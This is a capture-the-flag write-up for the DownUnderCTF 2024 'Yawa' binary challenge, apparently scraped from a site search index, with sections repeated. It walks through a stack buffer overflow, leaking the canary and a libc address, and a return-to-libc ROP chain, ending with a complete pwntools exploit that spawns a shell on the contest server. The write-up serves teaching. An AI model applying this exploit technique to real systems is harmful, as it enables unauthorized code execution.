24 25 26 pwndbg> info proc mappings process 19607 Mapped address spaces: Start Addr End Addr Size Offset Perms objfile 0x555555554000 0x555555555000 0x1000 0x0 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555555000 0x555555556000 0x1000 0x1000 r-xp /home/kali/Downloads/yawa_s/yawa_patched 0x555555556000 0x555555557000 0x1000 0x2000 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555557000 0x555555558000 0x1000 0x2000 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555558000 0x55555555b000 0x3000 0x3000 rw-p /home/kali/Downloads/yawa_s/yawa_patched 0x7ffff7c00000 0x7ffff7c28000 0x28000 0x0 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7c28000 0x7ffff7dbd000 0x195000 0x28000 r-xp /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7dbd000 0x7ffff7e15000 0x58000 0x1bd000 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e15000 0x7ffff7e16000 0x1000 0x215000 ---p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e16000 0x7ffff7e1a000 0x4000 0x215000 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e1a000 0x7ffff7e1c000 0x2000 0x219000 rw-p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e1c000 0x7ffff7e29000 0xd000 0x0 rw-p 0x7ffff7fb8000 0x7ffff7fbd000 0x5000 0x0 rw-p 0x7ffff7fbd000 0x7ffff7fc1000 0x4000 0x0 r--p [ vvar ] 0x7ffff7fc1000 0x7ffff7fc3000 0x2000 0x0 r-xp [ vdso ] 0x7ffff7fc3000 0x7ffff7fc5000 0x2000 0x0 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7fc5000 0x7ffff7fef000 0x2a000 0x2000 r-xp /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7fef000 0x7ffff7ffa000 0xb000 0x2c000 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7ffb000 0x7ffff7ffd000 0x2000 0x37000 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7ffd000 0x7ffff7fff000 0x2000 0x39000 rw-p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffffffde000 0x7ffffffff000 0x21000 0x0 rw-p [ stack ] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 cat /proc/19607/maps 555555554000 -555555555000 r--p 00000000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555555000 -555555556000 r-xp 00001000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555556000 -555555557000 r--p 00002000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555557000 -555555558000 r--p 00002000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555558000 -55555555b000 rw-p 00003000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 7ffff7c00000-7ffff7c28000 r--p 00000000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7c28000-7ffff7dbd000 r-xp 00028000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7dbd000-7ffff7e15000 r--p 001bd000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e15000-7ffff7e16000 ---p 00215000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e16000-7ffff7e1a000 r--p 00215000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e1a000-7ffff7e1c000 rw-p 00219000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e1c000-7ffff7e29000 rw-p 00000000 00 :00 0 7ffff7fb8000-7ffff7fbd000 rw-p 00000000 00 :00 0 7ffff7fbd000-7ffff7fc1000 r--p 00000000 00 :00 0 [ vvar ] 7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00 :00 0 [ vdso ] 7ffff7fc3000-7ffff7fc5000 r--p 00000000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7fc5000-7ffff7fef000 r-xp 00002000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7fef000-7ffff7ffa000 r--p 0002c000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7ffb000-7ffff7ffd000 r--p 00037000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7ffd000-7ffff7fff000 rw-p 00039000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffffffde000-7ffffffff000 rw-p 00000000 00 :00 0 [ stack ] Code snippet to get libc base address: leak libc base address 1 2 3 4 5 6 7 8 9 10 11 12 def get_libc_base_address (): io . recvuntil ( b \"> \" ) # wait till target binary is ready to read choice io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 103 ) # enter name 103 a + '\\n' that is appended automatically io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' # receive libc_main address in little endian and pad with 0 addr_libc_main = io . recvline () . strip () addr_libc_main = addr_libc_main + bytearray ( 8 - len ( addr_libc_main )) # convert from little to big endian and subtract return offset to get base address of libc return unpack ( addr_libc_main [ 0 : 8 ]) - 0x29d90 Remote shell \u00b6 With canary value and libc address in hands we are ready to get remote shell. Given there is NX protection and stack code is not executable we will use ROP (more on ironstone ) to execute return to libc technique. First we need to get address of string \"/bin/sh\" in libc library ( system function takes argument what to launch): 1 2 # strings -a -t x libc.so.6 | grep /bin/sh sh_offset = 0x1d8678 Using ROPgadget we find tons of useful gadgets in libc library: 1 $ ROPgadget --binary libc.so.6 | grep ret I've selected few that will help me to build return to libc chain: 0x000000000002a3e5: pop rdi 0x00000000000baaf9: xor rax, rax, ret With all of this our payload will look like: 88 bytes of padding for buffer 8 bytes of canary value 8 bytes value of 1 - unchanged 8 bytes pop rdi gadget 8 bytes address of \"/bin/sh\" string (this is argument for pop rdi gadget). As a result we set register RDI to /bin/sh 8 bytes xor rax, rax, ret - this is NOP operation for stack alignment 8 bytes address for system call Full python script: solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 from pwn import * context . binary = elfexe = ELF ( os . path . dirname ( __file__ ) + '/yawa_patched' ) libc = elfexe . libc context . log_level = 'warn' arguments = [] if args [ 'REMOTE' ]: remote_server = '2024.ductf.dev' remote_port = 30010 io = remote ( remote_server , remote_port ) else : io = process ([ elfexe . path ] + arguments ) def get_canary_value (): io . recvuntil ( b \"> \" ) # wait till target binary initialises io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 88 ) # enter our name 88 a + '\\n' (newline char appended by function sendline - it will overwrite nullbyte of canary) io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' addr_raw = io . recvline () . strip () # receive canary value in little endian order addr_raw = bytearray ( 1 ) + addr_raw # append nullbyte that we skipped return unpack ( addr_raw [ 0 : 8 ]) # convert to little endian byte array number def get_libc_base_address (): io . recvuntil ( b \"> \" ) # wait till target binary is ready to read choice io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 103 ) # enter name 103 a + '\\n' that is appended automatically io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' # receive libc_main address in little endian and convert it to number addr_libc_main = io . recvline () . strip () addr_libc_main = addr_libc_main + bytearray ( 8 - len ( addr_libc_main )) return unpack ( addr_libc_main [ 0 : 8 ]) - 0x29d90 canary = get_canary_value () # set base address of libc library so we can use pwntools to convert offsets to virtual addresses libc . address = get_libc_base_address () # strings -a -t x libc.so.6 | grep /bin/sh sh_offset = libc . offset_to_vaddr ( 0x1d8678 ) # readelf -s libc.so.6 | grep system system = libc . offset_to_vaddr ( 0x050d70 ) # pop rdi gadgetPopRdi = libc . offset_to_vaddr ( 0x000000000002a3e5 ) # xor rax, rax, ret gadgetNop = libc . offset_to_vaddr ( 0x00000000000baaf9 ) payload = flat ( b \"a\" * 88 , pack ( canary ), pack ( 1 ), pack ( gadgetPopRdi ), pack ( sh_offset ), pack ( gadgetNop ), pack ( system ) ) # send payload as name io . recvuntil ( b \"> \" ) io . sendline ( b \"1\" ) io . sendline ( payload ) # exit main which will execute return-to-libc io . recvuntil ( b \"> \" ) io . sendline ( b \"3\" ) io . interactive () io . close () Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Yawa"},{"location":"yawa/#prologue","text":"Difficulty: beginner Category: binary exploitation Solved: 184 Description Yet another welcome application. Input files: yawa.c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include <stdio.h> #include <stdlib.h> #include <unistd.h> void init () { setvbuf ( stdin , 0 , 2 , 0 ); setvbuf ( stdout , 0 , 2 , 0 ); } int menu () { int choice ; puts ( \"1. Tell me your name\" ); puts ( \"2. Get a personalised greeting\" ); printf ( \"> \" ); scanf ( \"%d\" , & choice ); return choice ; } int main () { init (); char name [ 88 ]; int choice ; while ( 1 ) { choice = menu (); if ( choice == 1 ) { read ( 0 , name , 0x88 ); } else if ( choice == 2 ) { printf ( \"Hello, %s \\n \" , name ); } else { break ; } } } yawa binary libc.so.6 ld-linux-x86-64.so.2 NB: Following indices bases system is used to avoid ambiguity. Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"yawa/#my-struggle","text":"Task includes binary(with libc library and ld linker to run it) and source code. First thing I review source code to build a plan. There is no win() function or equivalent so we likely have to get RCE (shell or similar). Source code is so short that it don't take long to find a bug in code that we can exploit: 1 2 3 4 5 6 7 8 9 10 11 12 13 char name [ 88 ]; # desclare variable name int choice ; while ( 1 ) { choice = menu (); if ( choice == 1 ) { read ( 0 , name , 0x88 ); # read input into variable name } else if ( choice == 2 ) { printf ( \"Hello, %s \\n \" , name ); } else { break ; } } Variable name is a buffer of 88 characters, but read(0, name 0x88) reads up to 0x88 = 136 characters. Means we can overflow stack and get code execution. Now that we know what to do lets check what type of binary we have and what types of protection are enabled: 1 2 3 4 5 6 7 8 9 10 11 12 13 $ file yawa yawa: ELF 64 -bit LSB pie executable, x86-64, # 64-bit version 1 ( SYSV ) , dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3 .2.0, BuildID [ sha1 ]= 7f7b72aaab967245353b6816808804a6c4ad2168, not stripped $ checksec --file = yawa RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Full RELRO Canary found NX enabled PIE enabled No RPATH RW-RUNPATH 45 Symbols No 0 2 yawa So, we have full package: Canary stack protection - stack is protected from overwrites; NX enabled - stack is not executable; PIE enabled - every time you run the file it gets loaded into a different memory address. If you are not familiar with any of above techniques and would like to learn about them (I am going to briefly touch them, but there is goal to include in-detail explanation of each of the techniques in this writeup) I recommend reading following gitbook notes: https://ir0nstone.gitbook.io/notes . This is by a long shot the best resource I have seen on internet on the topic both quality of explanation and completeness of content is superb. Next I use pwninit to be able to run binary on my machine without need to juggle with environment variable paths etc: 1 $ pwninit --bin yawa --libc ./libc.so.6 Exploit algorithm: Leak canary value from stack to bypass canary protection; Leak libc address to find system call; Use buffer overflow to get remote shell and obtain flag. Here is sample memory layout of stack that we will be working with: Memory layout 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0x7fffffffdc60: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc68: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc70: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc78: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc88: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc90: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdca0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdca8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdcb0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdcb8: 0x00 0x87 0x60 0x15 0x3c 0x9c 0x6f 0x4b 0x7fffffffdcc0: 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdcc8: 0x90 0x9d 0xc2 0xf7 0xff 0x7f 0x00 0x00 0x7fffffffdcd0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 Variable name is stored at address 0x7fffffffdc60 (line 1). Canary value is stored at address 0x7fffffffdcb8 (line 12), it always ends with 0x00 on linux (remember - its little endian). Therefore, its value is 0x4b6f9c3c15608700. At address 0x7fffffffdcb8 we see some 8byte long number 1 (not sure what it is - I've left it untouched in my work). At address 0x7fffffffdcc8 (line 14) we see return address from the main function (0x00007ffff7c29d90), here we want to place jump to system call.","title":"My struggle"},{"location":"yawa/#leak-canary-value","text":"Canary protection (read more here ) puts a random value on stack before execution and checks if hasn't been modified while function was running (if it is - program exits). If we want overwrite return address at 0x7fffffffdcc8, by overflowing variable name at 0x7fffffffdc60, we will have overwrite canary address at 0x7fffffffdcb8 as we can only write continues block of memory. Therefore, we will have to leak canary value from stack and when we overflow buffer put exactly same bytes in the same place to prevent canary protection from triggering. To leak address we can take advantage of \"print your name functionality\": 1 2 3 } else if ( choice == 2 ) { printf ( \"Hello, %s \\n \" , name ); } %s modifier of printf prints all bytes starting from address name until it reaches nullbyte. So if we put 'a' from 0x7fffffffdc60 till 0x7fffffffdcb8, it is going to print aaaaa... and won't stop just on 'a' (as there is no nullbyte) it will continue printing up until 0x7fffffffdcc0 (including entire canary value) and then stop: leak canary block 1 2 3 4 5 6 7 8 9 10 11 12 # 'io' is pwntools input/output pipe object that connected to process or remote server def get_canary_value (): io . recvuntil ( b \"> \" ) # wait till target binary initialises io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 88 ) # enter our name 88 a + '\\n' (newline char appended by function sendline - it will overwrite nullbyte of canary) io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' addr_raw = io . recvline () . strip () # receive canary value in little endian order addr_raw = bytearray ( 1 ) + addr_raw # append nullbyte that we skipped return unpack ( addr_raw [ 0 : 8 ]) # convert to little endian byte array number","title":"Leak canary value"},{"location":"yawa/#leak-libc-address","text":"Next step is to find base virtual address of libc, so we can find system call. Address on stack of return address from our main function is address of __libc_start_call_main - as you might guess its inside libc library. To read address of the function, we can use same technique as we used previously to reading canary value. When library is loaded into memory, its loaded as a single blob, so even though virtual location will be different each time, blob content is always same. Therefore we can calculate position of elements inside the library relative to each other and it won't change doesn't matter where library is loaded: 1 2 3 4 $ readelf -s ./libc.so.6 | grep __libc_start_cal 6 : 0000000000029d10 172 FUNC LOCAL DEFAULT 15 __libc_start_cal [ ... ] $ readelf -s libc.so.6 | grep system 8412 : 0000000000050d70 45 FUNC WEAK DEFAULT 15 system This means that system function will be always 0x50d70-0x29d10 = 0x27060 bytes apart from __libc_start_call_main function. For our our sample memory dump we saw return address 0x7ffff7c29d90 - we return to the middle of libc_start_call_main , so we can infer that libc library is mapped to address 0x7ffff7c29d90 - 0x29d90 = 0x7ffff7c00000 (segments are typically round numbers). So system address is 0x7ffff7c00000 + 0x50d70 = 0x7ffff7c50d70 . We can also double check our calculations by checking process memory mapping using gdb or cat: gdb debugger bash 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 pwndbg> info proc mappings process 19607 Mapped address spaces: Start Addr End Addr Size Offset Perms objfile 0x555555554000 0x555555555000 0x1000 0x0 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555555000 0x555555556000 0x1000 0x1000 r-xp /home/kali/Downloads/yawa_s/yawa_patched 0x555555556000 0x555555557000 0x1000 0x2000 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555557000 0x555555558000 0x1000 0x2000 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555558000 0x55555555b000 0x3000 0x3000 rw-p /home/kali/Downloads/yawa_s/yawa_patched 0x7ffff7c00000 0x7ffff7c28000 0x28000 0x0 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7c28000 0x7ffff7dbd000 0x195000 0x28000 r-xp /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7dbd000 0x7ffff7e15000 0x58000 0x1bd000 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e15000 0x7ffff7e16000 0x1000 0x215000 ---p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e16000 0x7ffff7e1a000 0x4000 0x215000 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e1a000 0x7ffff7e1c000 0x2000 0x219000 rw-p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e1c000 0x7ffff7e29000 0xd000 0x0 rw-p 0x7ffff7fb8000 0x7ffff7fbd000 0x5000 0x0 rw-p 0x7ffff7fbd000 0x7ffff7fc1000 0x4000 0x0 r--p [ vvar ] 0x7ffff7fc1000 0x7ffff7fc3000 0x2000 0x0 r-xp [ vdso ] 0x7ffff7fc3000 0x7ffff7fc5000 0x2000 0x0 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7fc5000 0x7ffff7fef000 0x2a000 0x2000 r-xp /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7fef000 0x7ffff7ffa000 0xb000 0x2c000 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7ffb000 0x7ffff7ffd000 0x2000 0x37000 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7ffd000 0x7ffff7fff000 0x2000 0x39000 rw-p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffffffde000 0x7ffffffff000 0x21000 0x0 rw-p [ stack ] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 cat /proc/19607/maps 555555554000 -555555555000 r--p 00000000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555555000 -555555556000 r-xp 00001000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555556000 -555555557000 r--p 00002000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555557000 -555555558000 r--p 00002000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555558000 -55555555b000 rw-p 00003000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 7ffff7c00000-7ffff7c28000 r--p 00000000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7c28000-7ffff7dbd000 r-xp 00028000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7dbd000-7ffff7e15000 r--p 001bd000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e15000-7ffff7e16000 ---p 00215000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e16000-7ffff7e1a000 r--p 00215000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e1a000-7ffff7e1c000 rw-p 00219000 08 :01 1213608 /home/kali/Downloads/yawa_s/libc.so.6 7ffff7e1c000-7ffff7e29000 rw-p 00000000 00 :00 0 7ffff7fb8000-7ffff7fbd000 rw-p 00000000 00 :00 0 7ffff7fbd000-7ffff7fc1000 r--p 00000000 00 :00 0 [ vvar ] 7ffff7fc1000-7ffff7fc3000 r-xp 00000000 00 :00 0 [ vdso ] 7ffff7fc3000-7ffff7fc5000 r--p 00000000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7fc5000-7ffff7fef000 r-xp 00002000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7fef000-7ffff7ffa000 r--p 0002c000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7ffb000-7ffff7ffd000 r--p 00037000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffff7ffd000-7ffff7fff000 rw-p 00039000 08 :01 1212676 /home/kali/Downloads/yawa_s/ld-2.35.so 7ffffffde000-7ffffffff000 rw-p 00000000 00 :00 0 [ stack ] Code snippet to get libc base address: leak libc base address 1 2 3 4 5 6 7 8 9 10 11 12 def get_libc_base_address (): io . recvuntil ( b \"> \" ) # wait till target binary is ready to read choice io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 103 ) # enter name 103 a + '\\n' that is appended automatically io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' # receive libc_main address in little endian and pad with 0 addr_libc_main = io . recvline () . strip () addr_libc_main = addr_libc_main + bytearray ( 8 - len ( addr_libc_main )) # convert from little to big endian and subtract return offset to get base address of libc return unpack ( addr_libc_main [ 0 : 8 ]) - 0x29d90","title":"Leak libc address"},{"location":"yawa/#remote-shell","text":"With canary value and libc address in hands we are ready to get remote shell. Given there is NX protection and stack code is not executable we will use ROP (more on ironstone ) to execute return to libc technique. First we need to get address of string \"/bin/sh\" in libc library ( system function takes argument what to launch): 1 2 # strings -a -t x libc.so.6 | grep /bin/sh sh_offset = 0x1d8678 Using ROPgadget we find tons of useful gadgets in libc library: 1 $ ROPgadget --binary libc.so.6 | grep ret I've selected few that will help me to build return to libc chain: 0x000000000002a3e5: pop rdi 0x00000000000baaf9: xor rax, rax, ret With all of this our payload will look like: 88 bytes of padding for buffer 8 bytes of canary value 8 bytes value of 1 - unchanged 8 bytes pop rdi gadget 8 bytes address of \"/bin/sh\" string (this is argument for pop rdi gadget). As a result we set register RDI to /bin/sh 8 bytes xor rax, rax, ret - this is NOP operation for stack alignment 8 bytes address for system call Full python script: solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 from pwn import * context . binary = elfexe = ELF ( os . path . dirname ( __file__ ) + '/yawa_patched' ) libc = elfexe . libc context . log_level = 'warn' arguments = [] if args [ 'REMOTE' ]: remote_server = '2024.ductf.dev' remote_port = 30010 io = remote ( remote_server , remote_port ) else : io = process ([ elfexe . path ] + arguments ) def get_canary_value (): io . recvuntil ( b \"> \" ) # wait till target binary initialises io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 88 ) # enter our name 88 a + '\\n' (newline char appended by function sendline - it will overwrite nullbyte of canary) io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' addr_raw = io . recvline () . strip () # receive canary value in little endian order addr_raw = bytearray ( 1 ) + addr_raw # append nullbyte that we skipped return unpack ( addr_raw [ 0 : 8 ]) # convert to little endian byte array number def get_libc_base_address (): io . recvuntil ( b \"> \" ) # wait till target binary is ready to read choice io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 103 ) # enter name 103 a + '\\n' that is appended automatically io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' # receive libc_main address in little endian and convert it to number addr_libc_main = io . recvline () . strip () addr_libc_main = addr_libc_main + bytearray ( 8 - len ( addr_libc_main )) return unpack ( addr_libc_main [ 0 : 8 ]) - 0x29d90 canary = get_canary_value () # set base address of libc library so we can use pwntools to convert offsets to virtual addresses libc . address = get_libc_base_address () # strings -a -t x libc.so.6 | grep /bin/sh sh_offset = libc . offset_to_vaddr ( 0x1d8678 ) # readelf -s libc.so.6 | grep system system = libc . offset_to_vaddr ( 0x050d70 ) # pop rdi gadgetPopRdi = libc . offset_to_vaddr ( 0x000000000002a3e5 ) # xor rax, rax, ret gadgetNop = libc . offset_to_vaddr ( 0x00000000000baaf9 ) payload = flat ( b \"a\" * 88 , pack ( canary ), pack ( 1 ), pack ( gadgetPopRdi ), pack ( sh_offset ), pack ( gadgetNop ), pack ( system ) ) # send payload as name io . recvuntil ( b \"> \" ) io . sendline ( b \"1\" ) io . sendline ( payload ) # exit main which will execute return-to-libc io . recvuntil ( b \"> \" ) io . sendline ( b \"3\" ) io . interactive () io . close ()","title":"Remote shell"},{"location":"yawa/#epilogue","text":"Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Epilogue"}]}